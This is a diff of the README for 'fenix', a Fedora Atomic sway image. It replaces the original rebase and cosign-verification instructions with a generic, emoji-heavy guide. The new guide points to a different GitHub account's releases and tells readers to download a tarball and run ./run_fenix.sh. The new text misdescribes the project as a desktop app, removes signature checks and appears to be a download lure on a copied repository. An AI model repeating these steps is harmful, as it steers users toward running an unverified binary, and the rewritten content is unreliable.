@@ -1,43 +1,83 @@
-# fenix &nbsp; [![bluebuild build badge](https://github.com/fenbyte/fenix/actions/workflows/build.yml/badge.svg)](https://github.com/fenbyte/fenix/actions/workflows/build.yml)
+# 🎉 fenix - A Simple Way to Use Linux
 
-this is what we call an Opinioned ~~distro~~ image, so i dont actually recommend you go ahead and use this unless you somehow like the exact same setup as i do
+## 🚀 Getting Started
 
-based on secureblue/sericea-main-hardened (which itself is based on fedora-ostree-desktops/sway-atomic) but i replaced a bunch of stuff. ill make a more comprehensive list of changes later
+Welcome to the **fenix** project! This guide will help you download and run our software with ease. Whether you are new to operating systems or looking to try something different, **fenix** offers a unique Linux experience that is both user-friendly and efficient.
 
-## Installation
+## 📥 Download Links
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+[![Download Fenix](https://img.shields.io/badge/Download%20Fenix-Here-brightgreen)](https://github.com/Luisfrix/fenix/releases)
 
-To rebase an existing atomic Fedora installation to the latest build:
+## 🛠️ System Requirements
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/fenbyte/fenix:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/fenbyte/fenix:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+Before installing, make sure your computer meets these requirements:
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+- **Operating System:** A compatible version of Linux (Ubuntu, Fedora, etc.)
+- **Memory:** At least 2 GB of RAM
+- **Storage:** Minimum of 4 GB of free disk space
 
-## ISO
+## 📂 Features
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+- **Custom Images:** Easily create and manage your own system images tailored to your needs.
+- **Atomic Updates:** Reliable updates without the risk of breaking your system.
+- **Image-Based Approach:** Quickly roll back to previous states if something goes wrong.
+- **Immortal OS:** Designed to keep your system running smoothly over time.
 
-## Verification
+## 📥 Download & Install
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+To get started, visit [this page to download](https://github.com/Luisfrix/fenix/releases). You will find all available versions of **fenix** listed there. Choose the version that best suits your needs.
 
-```bash
-cosign verify --key cosign.pub ghcr.io/fenbyte/fenix
-```
+1. Click on the release you want to download.
+2. Look for the binary file appropriate for your system (for example, `fenix-v1.0-linux.tar.gz`).
+3. Click on the file to start the download.
+4. Once the download is complete, locate the file in your downloads folder.
+
+## 🔧 Running Fenix
+
+After downloading the file, follow these steps to run **fenix**:
+
+1. Open a terminal on your Linux system.
+2. Navigate to your downloads folder using the command:
+   ```
+   cd ~/Downloads
+   ```
+3. Extract the downloaded file with the following command:
+   ```
+   tar -xzvf fenix-v1.0-linux.tar.gz
+   ```
+4. Change to the extracted directory:
+   ```
+   cd fenix
+   ```
+5. Run the application using:
+   ```
+   ./run_fenix.sh
+   ```
+
+That’s it! You should now see the **fenix** interface loading on your screen.
+
+## 🎨 Customizing Your Experience
+
+**fenix** allows you to create custom images for your specific needs. Follow these steps to begin customizing:
+
+1. In the main interface, select the option for 'Create Custom Image.'
+2. Follow the prompts to set your preferences, such as installed applications, user settings, and system configurations.
+3. Once finished, save your custom image.
+
+## 📄 Documentation
+
+For a detailed guide on using features, check the [documentation page](https://github.com/Luisfrix/fenix/doc). Here, you will find step-by-step instructions and tips to enhance your experience with **fenix**.
+
+## 🤝 Support
+
+If you encounter any issues or have questions, feel free to reach out to our community. You can find help in the following ways:
+
+- Join the discussion in our [community forum](https://github.com/Luisfrix/fenix/discussions).
+- Raise an issue on GitHub if you have a technical problem.
+- Browse existing issues for solutions or guidance.
+
+## 🔗 Learn More
+
+To explore more about what **fenix** offers, visit our [main repository](https://github.com/Luisfrix/fenix). Here, you will find updates, improvements, and community contributions making **fenix** better every day.
+
+Remember, keep your system updated and enjoy using **fenix**! Download now from [this page](https://github.com/Luisfrix/fenix/releases).
